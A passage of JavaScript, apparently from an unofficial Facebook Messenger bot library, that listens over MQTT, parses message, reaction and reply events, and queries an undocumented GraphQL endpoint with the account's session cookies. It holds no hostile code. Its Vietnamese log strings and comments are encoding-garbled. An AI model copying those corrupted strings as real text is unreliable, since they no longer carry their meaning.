global.mqttClient.end();\n        \n        if (mqttReconnectCount < maxReconnectAttempts) {\n            mqttReconnectCount++;\n            const backoffTime = reconnectBackoff * Math.pow(2, mqttReconnectCount - 1);\n            setTimeout(() => {\n                if (ctx.globalOptions.autoReconnect) {\n                    getSeqID();\n                }\n            }, backoffTime);\n        } else {\n            globalCallback({\n                type: 'stop_listen',\n                error: 'Server ƒê√£ S·∫≠p - Auto Restart'\n            }, null);\n            return process.exit(1);\n        }\n    });\n\n    global.mqttClient.on('connect', () => {\n        mqttReconnectCount = 0;\n        \n        if (!global.Fca.Data.Setup || global.Fca.Data.Setup === undefined) {\n            if (global.Fca.Require.FastConfig.RestartMQTT_Minutes !== 0 && global.Fca.Data.StopListening !== true) {\n                global.Fca.Data.Setup = true;\n                setTimeout(() => {\n                    global.Fca.Require.logger.Warning('Closing MQTT Client...');\n                    ctx.mqttClient.end();\n                    global.Fca.Require.logger.Warning('Reconnecting MQTT Client...');\n                    global.Fca.Data.Setup = false;\n                    getSeqID();\n                }, Number(global.Fca.Require.FastConfig.RestartMQTT_Minutes) * 60 * 1000);\n            }\n        }\n\n        if (process.env.OnStatus === undefined) {\n            global.Fca.Require.logger.Normal('Horizon Prime');\n\n            const MemoryManager = require('../Extra/Src/Release_Memory');\n            const path = require('path');\n\n            const SettingMemoryManager = {\n                warningThreshold: 0.7,\n                releaseThreshold: 0.8,\n                maxThreshold: 0.9,\n                interval: 60 * 1000,\n                logLevel: 'warn',\n                logFile: path.join(process.cwd(), 'Horizon_Database', 'memory.log'),\n                smartReleaseEnabled: true,\n                allowLog: (global.Fca.Require.FastConfig.AntiStuckAndMemoryLeak.LogFile.Use || false)\n            };\n\n            const memoryManager = new MemoryManager(SettingMemoryManager);\n            memoryManager.autoStart(60 * 60 * 1000);\n\n            if (global.Fca.Require.FastConfig.AntiStuckAndMemoryLeak.AutoRestart.Use) {\n                memoryManager.onMaxMemory(function() {\n                    global.Fca.Require.logger.Warning('Memory Usage >= 90% - Auto Restart Avoid Crash');\n                    process.exit(1);\n                });\n            }\n            process.env.OnStatus = true;\n        }\n\n        topics.forEach((topicsub) => global.mqttClient.subscribe(topicsub));\n\n        const queue = {\n            sync_api_version: 11,\n            max_deltas_able_to_process: 100,\n            delta_batch_size: 500,\n            encoding: 'JSON',\n            entity_fbid: ctx.userID,\n            initial_titan_sequence_id: ctx.lastSeqId,\n            device_params: null\n        };\n\n        global.mqttClient.publish(\"/messenger_sync_create_queue\", JSON.stringify(queue), {\n            qos: 1,\n            retain: false\n        });\n\n        var rTimeout = setTimeout(function() {\n            global.mqttClient.end();\n            getSeqID();\n        }, 3000);\n\n        ctx.tmsWait = function() {\n            clearTimeout(rTimeout);\n            ctx.globalOptions.emitReady ? globalCallback({\n                type: \"ready\",\n                error: null\n            }) : '';\n            delete ctx.tmsWait;\n        };\n    });\n\n    global.mqttClient.on('message', (topic, message, _packet) => {\n        try {\n            const jsonMessage = JSON.parse(message.toString());\n            if (topic === \"/t_ms\") {\n                if (ctx.tmsWait && typeof ctx.tmsWait == \"function\") ctx.tmsWait();\n\n                if (jsonMessage.firstDeltaSeqId && jsonMessage.syncToken) {\n                    ctx.lastSeqId = jsonMessage.firstDeltaSeqId;\n                    ctx.syncToken = jsonMessage.syncToken;\n                }\n\n                if (jsonMessage.lastIssuedSeqId) ctx.lastSeqId = parseInt(jsonMessage.lastIssuedSeqId);\n\n                for (var i in jsonMessage.deltas) {\n                    var delta = jsonMessage.deltas[i];\n                    parseDelta(defaultFuncs, api, ctx, globalCallback, {\n                        delta: delta\n                    });\n                }\n            } else if (topic === '/thread_typing' || topic === '/orca_typing_notifications') {\n                var typ = {\n                    type: \"typ\",\n                    isTyping: !!jsonMessage.state,\n                    from: jsonMessage.sender_fbid.toString(),\n                    threadID: utils.formatID((jsonMessage.thread || jsonMessage.sender_fbid).toString())\n                };\n                (function() {\n                    globalCallback(null, typ);\n                })();\n            } else if (topic === '/orca_presence' && !ctx.globalOptions.updatePresence) {\n                for (var i in jsonMessage.list) {\n                    var data = jsonMessage.list[i];\n                    var userID = data[\"u\"];\n\n                    var presence = {\n                        type: \"presence\",\n                        userID: userID.toString(),\n                        timestamp: data[\"l\"] * 1000,\n                        statuses: data[\"p\"]\n                    };\n                    (function() {\n                        globalCallback(null, presence);\n                    })();\n                }\n            }\n        } catch (err) {\n            console.log('Error: mqttClient.on(message)', err); // Th√™m d√≤ng n√†y\n        }\n    });\n\n    process.on('SIGINT', () => {\n        LogUptime();\n        process.kill(process.pid);\n    });\n\n    process.on('exit', LogUptime);\n}\nfunction parseDelta(defaultFuncs, api, ctx, globalCallback, {\n  delta\n}) {\n  if (delta.class === 'NewMessage') {\n    if (ctx.globalOptions.pageID && ctx.globalOptions.pageID !== delta.queue) return;\n\n    const resolveAttachmentUrl = (i) => {\n      if (!delta.attachments || i === delta.attachments.length || utils.getType(delta.attachments) !== 'Array') {\n        let fmtMsg;\n        try {\n          fmtMsg = utils.formatDeltaMessage(delta);\n        } catch (err) {\n          console.log('Error: parseDelta.formatDeltaMessage', err); // Th√™m d√≤ng n√†y\n          return log.error('L·ªói Nh·∫π', err);\n        }\n        \n        if (fmtMsg) {\n            const isGroup = fmtMsg.isGroup;\n            const threadID = fmtMsg.threadID;\n            const messageID = fmtMsg.messageID;\n            \n            global.Fca.Data.event.set(\"Data\", {\n                isGroup,\n                threadID,\n                messageID\n            });\n\n            if (global.Fca.Require.FastConfig.AntiGetInfo.AntiGetThreadInfo) {\n                global.Fca.Data.MsgCount.set(fmtMsg.threadID, ((global.Fca.Data.MsgCount.get(fmtMsg.threadID)) + 1 || 1));\n            }    \n\n          if (ctx.globalOptions.autoMarkDelivery) {\n            markDelivery(ctx, api, fmtMsg.threadID, fmtMsg.messageID);\n          }\n\n          if (!ctx.globalOptions.selfListen && fmtMsg.senderID === ctx.userID) return;\n          globalCallback(null, fmtMsg);\n        }\n      } else {\n        const attachment = delta.attachments[i];\n        if (attachment.mercury.attach_type === 'photo') {\n          api.resolvePhotoUrl(attachment.fbid, (err, url) => {\n            if (err) {\n                console.log('Error: parseDelta.resolvePhotoUrl', err); // Th√™m d√≤ng n√†y\n            }\n            if (!err) attachment.mercury.metadata.url = url;\n            resolveAttachmentUrl(i + 1);\n          });\n        } else {\n          resolveAttachmentUrl(i + 1);\n        }\n      }\n    };\n\n    resolveAttachmentUrl(0);\n  } else if (delta.class === 'ClientPayload') {\n    const clientPayload = utils.decodeClientPayload(delta.payload);\n    if (clientPayload && clientPayload.deltas) {\n      for (const delta of clientPayload.deltas) {\n        if (delta.deltaMessageReaction && !!ctx.globalOptions.listenEvents) {\n          const messageReaction = {\n            type: 'message_reaction',\n            threadID: (delta.deltaMessageReaction.threadKey.threadFbId ? delta.deltaMessageReaction.threadKey.threadFbId : delta.deltaMessageReaction.threadKey.otherUserFbId).toString(),\n            messageID: delta.deltaMessageReaction.messageId,\n            reaction: delta.deltaMessageReaction.reaction,\n            senderID: delta.deltaMessageReaction.senderId.toString(),\n            userID: delta.deltaMessageReaction.userId.toString(),\n          };\n          globalCallback(null, messageReaction);\n        } else if (delta.deltaRecallMessageData && !!ctx.globalOptions.listenEvents) {\n          const messageUnsend = {\n            type: 'message_unsend',\n            threadID: (delta.deltaRecallMessageData.threadKey.threadFbId ? delta.deltaRecallMessageData.threadKey.threadFbId : delta.deltaRecallMessageData.threadKey.otherUserFbId).toString(),\n            messageID: delta.deltaRecallMessageData.messageID,\n            senderID: delta.deltaRecallMessageData.senderID.toString(),\n            deletionTimestamp: delta.deltaRecallMessageData.deletionTimestamp,\n            timestamp: delta.deltaRecallMessageData.timestamp,\n          };\n          globalCallback(null, messageUnsend);\n        } else if (delta.deltaMessageReply) {\n          const mdata =\n            delta.deltaMessageReply.message === undefined ?\n            [] :\n            delta.deltaMessageReply.message.data === undefined ?\n            [] :\n            delta.deltaMessageReply.message.data.prng === undefined ?\n            [] :\n            JSON.parse(delta.deltaMessageReply.message.data.prng);\n\n          const m_id = mdata.map((u) => u.i);\n          const m_offset = mdata.map((u) => u.o);\n          const m_length = mdata.map((u) => u.l);\n\n          const mentions = {};\n          for (let i = 0; i < m_id.length; i++) {\n            mentions[m_id[i]] = (delta.deltaMessageReply.message.body || '').substring(m_offset[i], m_offset[i] + m_length[i]);\n          }\n\n          const callbackToReturn = {\n            type: 'message_reply',\n            threadID: (delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.message.messageMetadata.threadKey.otherUserFbId).toString(),\n            messageID: delta.deltaMessageReply.message.messageMetadata.messageId,\n            senderID: delta.deltaMessageReply.message.messageMetadata.actorFbId.toString(),\n            attachments: ( delta.deltaMessageReply.message.attachments || [] )\n              .map((att) => {\n                const mercury = JSON.parse(att.mercuryJSON);\n                Object.assign(att, mercury);\n                return att;\n              })\n              .map((att) => {\n                let x;\n                try {\n                  x = utils._formatAttachment(att);\n                } catch (ex) {\n                  console.log('Error: parseDelta._formatAttachment', ex); // Th√™m d√≤ng n√†y\n                  x = att;\n                  x.error = ex;\n                  x.type = 'unknown';\n                }\n                return x;\n              }),\n            args: (delta.deltaMessageReply.message.body || '').trim().split(/\\s+/),\n            body: delta.deltaMessageReply.message.body || '',\n            isGroup: !!delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId,\n            mentions,\n            timestamp: parseInt(delta.deltaMessageReply.message.messageMetadata.timestamp),\n            participantIDs: (delta.deltaMessageReply.message.participants || []).map((e) => e.toString()),\n          };\n\n          if (delta.deltaMessageReply.repliedToMessage) {\n            const mdata =\n              delta.deltaMessageReply.repliedToMessage === undefined ?\n              [] :\n              delta.deltaMessageReply.repliedToMessage.data === undefined ?\n              [] :\n              delta.deltaMessageReply.repliedToMessage.data.prng === undefined ?\n              [] :\n              JSON.parse(delta.deltaMessageReply.repliedToMessage.data.prng);\n\n            const m_id = mdata.map((u) => u.i);\n            const m_offset = mdata.map((u) => u.o);\n            const m_length = mdata.map((u) => u.l);\n\n            const rmentions = {};\n            for (let i = 0; i < m_id.length; i++) {\n              rmentions[m_id[i]] = (delta.deltaMessageReply.repliedToMessage.body || '').substring(m_offset[i], m_offset[i] + m_length[i]);\n            }\n\n            callbackToReturn.messageReply = {\n              threadID: (delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.otherUserFbId).toString(),\n              messageID: delta.deltaMessageReply.repliedToMessage.messageMetadata.messageId,\n              senderID: delta.deltaMessageReply.repliedToMessage.messageMetadata.actorFbId.toString(),\n              attachments: delta.deltaMessageReply.repliedToMessage.attachments\n                .map((att) => {\n                  const mercury = JSON.parse(att.mercuryJSON);\n                  Object.assign(att, mercury);\n                  return att;\n                })\n                .map((att) => {\n                  let x;\n                  try {\n                    x = utils._formatAttachment(att);\n                  } catch (ex) {\n                    console.log('Error: parseDelta._formatAttachment', ex); // Th√™m d√≤ng n√†y\n                    x = att;\n                    x.error = ex;\n                    x.type = 'unknown';\n                  }\n                  return x;\n                }),\n              args: (delta.deltaMessageReply.repliedToMessage.body || '').trim().split(/\\s+/),\n              body: delta.deltaMessageReply.repliedToMessage.body || '',\n              isGroup: !!delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId,\n              mentions: rmentions,\n              timestamp: parseInt(delta.deltaMessageReply.repliedToMessage.messageMetadata.timestamp),\n              participantIDs: (delta.deltaMessageReply.repliedToMessage.participants || []).map((e) => e.toString()),\n            };\n          } else if (delta.deltaMessageReply.replyToMessageId) {\n            return defaultFuncs\n              .post('https://www.facebook.com/api/graphqlbatch/', ctx.jar, {\n                av: ctx.globalOptions.pageID,\n                queries: JSON.stringify({\n                  o0: {\n                    doc_id: '2848441488556444',\n                    query_params: {\n                      thread_and_message_id: {\n                        thread_id: callbackToReturn.threadID,\n                        message_id: delta.deltaMessageReply.replyToMessageId.id,\n                      },\n                    },\n                  },\n                }),\n              })\n              .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n              .then((resData) => {\n                if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n                if (resData[resData.length - 1].successful_results === 0) throw {\n                  error: 'forcedFetch: there was no successful_results',\n                  res: resData\n                };\n                const fetchData = resData[0].o0.data.message;\n                const mobj = {};\n\n                for (const n in fetchData.message.ranges) {\n                  mobj[fetchData.message.ranges[n].entity.id] = (fetchData.message.text || '').substr(fetchData.message.ranges[n].offset, fetchData.message.ranges[n].length);\n                }\n                callbackToReturn.messageReply = {\n                  type: 'Message',\n                  threadID: callbackToReturn.threadID,\n                  messageID: fetchData.message_id,\n                  senderID: fetchData.message_sender.id.toString(),\n                  attachments: fetchData.message.blob_attachment.map((att) => utils._formatAttachment({\n                    blob_attachment: att\n                  })),\n                  args: (fetchData.message.text || '').trim().split(/\\s+/) || [],\n                  body: fetchData.message.text || '',\n                  isGroup: callbackToReturn.isGroup,\n                  mentions: mobj,\n                  timestamp: parseInt(fetchData.timestamp_precise),\n                };\n              })\n\n              .catch((err) => {\n                  console.log('Error: parseDelta.messageReply.forcedFetch', err); // Th√™m d√≤ng n√†y\n                  log.error('forcedFetch', err)\n              })\n              .finally(() => {\n                if (ctx.globalOptions.autoMarkDelivery) {\n                  markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n                }\n\n                if (!ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID) return;\n                globalCallback(null, callbackToReturn);\n              });\n          } else {\n            callbackToReturn.delta = delta;\n          }\n          if (ctx.globalOptions.autoMarkDelivery) {\n            markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n          }\n\n          if (!ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID) return;\n          globalCallback(null, callbackToReturn);\n        }\n      }\n\n      return;\n    }\n  }\n  switch (delta.class) {\n    case 'ReadReceipt': {\n      let fmtMsg;\n      try {\n        fmtMsg = utils.formatDeltaReadReceipt(delta);\n      } catch (err) {\n        console.log('Error: parseDelta.formatDeltaReadReceipt', err); // Th√™m d√≤ng n√†y\n        return log.error('L·ªói Nh·∫π', err);\n      }\n      globalCallback(null, fmtMsg);\n      break;\n    }\n    case 'AdminTextMessage': {\n      switch (delta.type) {\n        case 'joinable_group_link_mode_change':\n        case 'magic_words':\n        case 'pin_messages_v2':\n        case 'change_thread_theme':\n        case 'change_thread_icon':\n        case 'change_thread_nickname':\n        case 'change_thread_admins':\n        case 'change_thread_approval_mode':\n        case 'group_poll':\n        case 'messenger_call_log':\n        case 'participant_joined_group_call': {\n          let fmtMsg;\n          try {\n            fmtMsg = utils.formatDeltaEvent(delta);\n          } catch (err) {\n            console.log(delta);\n            console.log('Error: parseDelta.formatDeltaEvent', err); // Th√™m d√≤ng n√†y\n            return log.error('L·ªói Nh·∫π', err);\n          }\n          globalCallback(null, fmtMsg);\n          break;\n        }\n      }\n      break;\n    }\n\n    //For group images\n    case 'ForcedFetch': {\n      if (!delta.threadKey) return;\n      const mid = delta.messageId;\n      const tid = delta.threadKey.threadFbId;\n\n      if (mid && tid) {\n        const form = {\n          av: ctx.globalOptions.pageID,\n          queries: JSON.stringify({\n            o0: {\n              doc_id: '2848441488556444',\n              query_params: {\n                thread_and_message_id: {\n                  thread_id: tid.toString(),\n                  message_id: mid,\n                },\n              },\n            },\n          }),\n        };\n        defaultFuncs\n          .post('https://www.facebook.com/api/graphqlbatch/', ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then((resData) => {\n            if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n            if (resData[resData.length - 1].successful_results === 0) throw {\n              error: 'forcedFetch: there was no successful_results',\n              res: resData\n            };\n\n            const fetchData = resData[0].o0.data.message;\n\n            if (utils.getType(fetchData) === 'Object') {\n              log.info('forcedFetch', fetchData);\n              switch (fetchData.__typename) {\n                case 'ThreadImageMessage':\n                  if (!ctx.globalOptions.selfListen && fetchData.message_sender.id.toString() === ctx.userID) return;\n                  if (!ctx.loggedIn) return;\n\n                  globalCallback(null, {\n                    type: 'change_thread_image',\n                    threadID: utils.formatID(tid.toString()),\n                    snippet: fetchData.snippet,\n                    timestamp: fetchData.timestamp_precise,\n                    author: fetchData.message_sender.id,\n                    image: {\n                      attachmentID: fetchData.image_with_metadata && fetchData.image_with_metadata.legacy_attachment_id,\n                      width: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.x,\n                      height: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.y,\n                      url: fetchData.image_with_metadata && fetchData.image_with_metadata.preview.uri,\n                    },\n                  });\n                  break;\n                case 'UserMessage': {\n                  const event = {\n                    type: 'message',\n                    senderID: utils.formatID(fetchData.message_sender.id),\n                    body: fetchData.message.text || '',\n                    threadID: utils.formatID(tid.toString()),\n                    messageID: fetchData.message_id,\n                    attachments: [{\n                      type: 'share',\n                      ID: fetchData.extensible_attachment.legacy_attachment_id,\n                      url: fetchData.extensible_attachment.story_attachment.url,\n                      title: fetchData.extensible_attachment.story_attachment.title_with_entities.text,\n                      description: fetchData.extensible_attachment.story_attachment.description.text,\n                      source: fetchData.extensible_attachment.story_attachment.source,\n                      image: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).uri,\n                      width: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).width,\n                      height: ((fetchData.extensible_attachment.story_attachment.media || {}).image || {}).height,\n                      playable: (fetchData.extensible_attachment.story_attachment.media || {}).is_playable || false,\n                      duration: (fetchData.extensible_attachment.story_attachment.media || {}).playable_duration_in_ms || 0,\n                      subattachments: fetchData.extensible_attachment.subattachments,\n                      properties: fetchData.extensible_attachment.story_attachment.properties,\n                    }],\n                    mentions: {},\n                    timestamp: parseInt(fetchData.timestamp_precise),\n                    isGroup: (fetchData.message_sender.id !== tid.toString()),\n                  };\n\n                  log.info('ff-Return', event);\n                  globalCallback(null, event);\n                  break;\n                }\n                default:\n                  console.log('Error: parseDelta.ForcedFetch', fetchData); // Th√™m d√≤ng n√†y\n                  log.error('forcedFetch', fetchData);\n              }\n            } else {\n              console.log('Error: parseDelta.ForcedFetch', fetchData); // Th√™m d√≤ng n√†y\n              log.error('forcedFetch', fetchData);\n            }\n          })\n          .catch((err) => {\n              console.log('Error: parseDelta.ForcedFetch.catch', err); // Th√™m d√≤ng n√†y\n              log.error('forcedFetch', err)\n          });\n      }\n      break;\n    }\n    case 'ThreadName':\n    case 'ParticipantsAddedToGroupThread':\n    case 'ParticipantLeftGroupThread': {\n      let formattedEvent;\n      try {\n        formattedEvent = utils.formatDeltaEvent(delta);\n      } catch (err) {\n        console.log('Error: parseDelta.formatDeltaEvent', err); // Th√™m d√≤ng n√†y\n        console.log(err);\n        return log.error('L·ªói Nh·∫π', err);\n      }\n\n      if (!ctx.globalOptions.selfListen && formattedEvent.author.toString() === ctx.userID) return;\n      if (!ctx.loggedIn) return;\n      globalCallback(null, formattedEvent);\n      break;\n    }\n    case 'NewMessage': {\n      const hasLiveLocation = delta => {\n        const attachment = delta.attachments?.[0]?.mercury?.extensible_attachment;\n        const storyAttachment = attachment?.story_attachment;\n        return storyAttachment?.style_list?.includes('message_live_location');\n      };\n      \n      if (delta.attachments?.length === 1 && hasLiveLocation(delta)) {\n        delta.class = 'UserLocation';\n        \n        try {\n          const fmtMsg = utils.formatDeltaEvent(delta);\n          globalCallback(null, fmtMsg);\n        } catch (err) {\n          console.log('Error: parseDelta.NewMessage.hasLiveLocation', err); // Th√™m d√≤ng n√†y\n          console.log(delta);\n          log.error('L·ªói Nh·∫π', err);\n        }\n      }\n      break;\n    }\n  }\n}\n\nfunction markDelivery(ctx, api, threadID, messageID) {\n  if (threadID && messageID) {\n    api.markAsDelivered(threadID, messageID, (err) => {\n      if (err) {\n        console.log('Error: markAsDelivered', err); // Th√™m d√≤ng n√†y\n        log.error('markAsDelivered', err);\n      } else {\n        if (ctx.globalOptions.autoMarkRead) {\n          api.markAsRead(threadID, (err) => {\n            if (err) {\n                console.log('Error: markAsRead', err); // Th√™m d√≤ng n√†y\n                log.error('markAsDelivered', err);\n            }\n          });\n        }\n      }\n    });\n  }\n}\n\nfunction getRespData(Type, payload) {\n  try {\n    switch (Type) {\n      case \"sendMqttMessage\": {\n        return {\n          type: Type,\n          threadID: payload.step[1][2][2][1][2],\n          messageID: payload.step[1][2][2][1][3],\n          payload: payload.step[1][2]\n        };\n      }\n      default: {\n        return {\n          Data: payload.step[1][2][2][1],\n          type: Type,\n          payload: payload.step[1][2]\n        };\n      }\n    }\n  } catch (e) {\n    console.log('Error: getRespData', e); // Th√™m d√≤ng n√†y\n    return null;\n  }\n}\n\nfunction LogUptime() {\n  const uptime = process.uptime();\n  const { join } = require('path');\n  const filePath = join(__dirname, '../CountTime.json');\n\n  let time1;\n  try {\n    if (global.Fca.Require.fs.existsSync(filePath)) {\n      time1 = Number(global.Fca.Require.fs.readFileSync(filePath, 'utf8')) || 0;\n    } else {\n      time1 = 0;\n    }\n\n    global.Fca.Require.fs.writeFileSync(filePath, String(Number(uptime) + time1), 'utf8');\n  } catch (err) {\n    console.log('Error: LogUptime', err); // Th√™m d√≤ng n√†y\n  }\n}\n\nif (global.Fca.Require.FastConfig.AntiGetInfo.AntiGetThreadInfo) {\n  setInterval(() => {\n    try {\n      const { updateMessageCount, getData, hasData } = require('../Extra/ExtraGetThread');\n      const Data = global.Fca.Data.MsgCount;\n      const Arr = Array.from(Data.keys());\n      for (let i of Arr) {\n        const Count = parseInt(Data.get(i));\n        if (hasData(i)) {\n          let x = getData(i);\n          x.messageCount += Count;\n          updateMessageCount(i, x);\n          Data.delete(i);\n        }\n      }\n    } catch (e) {\n      console.log('Error: AntiGetThreadInfo Interval', e); // Th√™m d√≤ng n√†y\n    }\n  }, 30 * 1000);\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n    var globalCallback = identity;\n    \n    getSeqID = function() {\n        console.log(\"[LOG] B·∫Øt ƒë·∫ßu g·ªçi getSeqID ƒë·ªÉ l·∫•y sequence ID...\");\n        ctx.t_mqttCalled = false;\n        defaultFuncs\n            .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n            .then((resData) => {\n                console.log(\"[LOG] Nh·∫≠n ƒë∆∞·ª£c ph·∫£n h·ªìi t·ª´ graphqlbatch.\");\n\n                if (utils.getType(resData) != \"Array\") {\n                    console.error(\"[LOG] Ph·∫£n h·ªìi kh√¥ng ph·∫£i l√† m·ªôt Array. C√≥ th·ªÉ ƒë√£ m·∫•t ƒëƒÉng nh·∫≠p.\");\n                    if (global.Fca.Require.FastConfig.AutoLogin) {\n                        return global.Fca.Require.logger.Warning(global.Fca.Require.Language.Index.AutoLogin, function() {\n                            return global.Fca.Action('AutoLogin');\n                        });\n                    } else if (!global.Fca.Require.FastConfig.AutoLogin) {\n                        return global.Fca.Require.logger.Error(global.Fca.Require.Language.Index.ErrAppState);\n                    }\n                    return;\n                }\n\n                console.log(\"[LOG] D·ªØ li·ªáu ph·∫£n h·ªìi h·ª£p l·ªá, ƒëang x·ª≠ l√Ω...\");\n                if (resData && resData[resData.length - 1].error_results > 0) {\n                    console.error(\"[LOG] Ph·∫£n h·ªìi GraphQL c√≥ l·ªói:\", resData[0].o0.errors);\n                    throw resData[0].o0.errors;\n                }\n                if (resData[resData.length - 1].successful_results === 0) {\n                     console.error(\"[LOG] Ph·∫£n h·ªìi GraphQL kh√¥ng c√≥ k·∫øt qu·∫£ th√†nh c√¥ng.\");\n                    throw { error: \"getSeqId: there was no successful_results\", res: resData };\n                }\n                \n                const sync_sequence_id = resData[0].o0.data.viewer.message_threads.sync_sequence_id;\n                if (sync_sequence_id) {\n                    console.log(`[LOG] L·∫•y sequence ID th√†nh c√¥ng: ${sync_sequence_id}`);\n                    ctx.lastSeqId = sync_sequence_id;\n                    console.log(\"[LOG] B·∫Øt ƒë·∫ßu kh·ªüi ch·∫°y listenMqtt...\");\n                    listenMqtt(defaultFuncs, api, ctx, globalCallback);\n                } else {\n                     console.error(\"[LOG] Kh√¥ng t√¨m th·∫•y sync_sequence_id trong ph·∫£n h·ªìi.\");\n                    throw { error: \"getSeqId: no sync_sequence_id found.\", res: resData };\n                }\n            })\n            .catch((err) => {\n                console.error(\"[LOG] L·ªñI trong chu·ªói promise c·ªßa getSeqID:\", err);\n                log.error(\"getSeqId\", err);\n                if (utils.getType(err) == \"Object\" && err.error === \"getSeqId: no sync_sequence_id found.\") {\n                    console.log(\"[LOG] ƒê√°nh d·∫•u tr·∫°ng th√°i ƒë√£ ƒëƒÉng xu·∫•t.\");\n                    ctx.loggedIn = false;\n                }\n                return globalCallback(err);\n            });\n    };\n\n    return function(callback) {\n        console.log(\"[LOG] Tr√¨nh l·∫Øng nghe (listener) ƒëang ƒë∆∞·ª£c kh·ªüi t·∫°o...\");\n        class MessageEmitter extends EventEmitter {\n            stopListening(callback) {\n                callback = callback || (() => {});\n                console.log(\"[LOG] ƒêang d·ª´ng tr√¨nh l·∫Øng nghe (stopListening)...\");\n                globalCallback = identity;\n                if (ctx.mqttClient) {\n                    ctx.mqttClient.unsubscribe(\"/webrtc\");\n                    ctx.mqttClient.unsubscribe(\"/rtc_multi\");\n                    ctx.mqttClient.unsubscribe(\"/onevc\");\n                    ctx.mqttClient.publish(\"/browser_close\", \"{}\");\n                    ctx.mqttClient.end(false, function(...data) {\n                        console.log(\"[LOG] MQTT client ƒë√£ k·∫øt th√∫c.\");\n                        ctx.mqttClient = undefined;\n                        callback(data);\n                    });\n                }\n                global.Fca.Data.StopListening = true;\n            }\n        }\n\n        var msgEmitter = new MessageEmitter();\n        globalCallback = (callback || function(error, message) {\n            if (error) {\n                console.error('[LOG] L·ªói ƒë∆∞·ª£c ƒë·∫©y v·ªÅ globalCallback:', error);\n                return msgEmitter.emit(\"error\", error);\n            }\n            // console.log(\"[LOG] Nh·∫≠n ƒë∆∞·ª£c message m·ªõi, ƒëang ƒë·∫©y ƒëi...\");\n            msgEmitter.emit(\"message\", message);\n        });\n\n        console.log(\"[LOG] Reset tr·∫°ng th√°i cho l·∫ßn nghe m·ªõi.\");\n        if (!ctx.firstListen) ctx.lastSeqId = null;\n        ctx.syncToken = undefined;\n        ctx.t_mqttCalled = false;\n\n        form = {\n            av: ctx.globalOptions.pageID,\n            queries: JSON.stringify({\n                o0: {\n                    doc_id: '3336396659757871',\n                    query_params: {\n                        limit: 1, before: null, tags: ['INBOX'],\n                        includeDeliveryReceipts: false, includeSeqID: true,\n                    }\n                }\n            })\n        };\n\n        if (!ctx.firstListen || !ctx.lastSeqId) {\n            console.log(\"[LOG] L·∫ßn nghe ƒë·∫ßu ti√™n ho·∫∑c kh√¥ng c√≥ lastSeqId, ƒëang g·ªçi getSeqID...\");\n            getSeqID();\n        } else {\n            console.log(\"[LOG] ƒê√£ c√≥ lastSeqId, g·ªçi th·∫≥ng listenMqtt...\");\n            listenMqtt(defaultFuncs, api, ctx, globalCallback);\n        }\n        ctx.firstListen = false;\n\n        return msgEmitter;\n    };\n};","path":null,"size_bytes":38803,"size_tokens":null}},"version":2}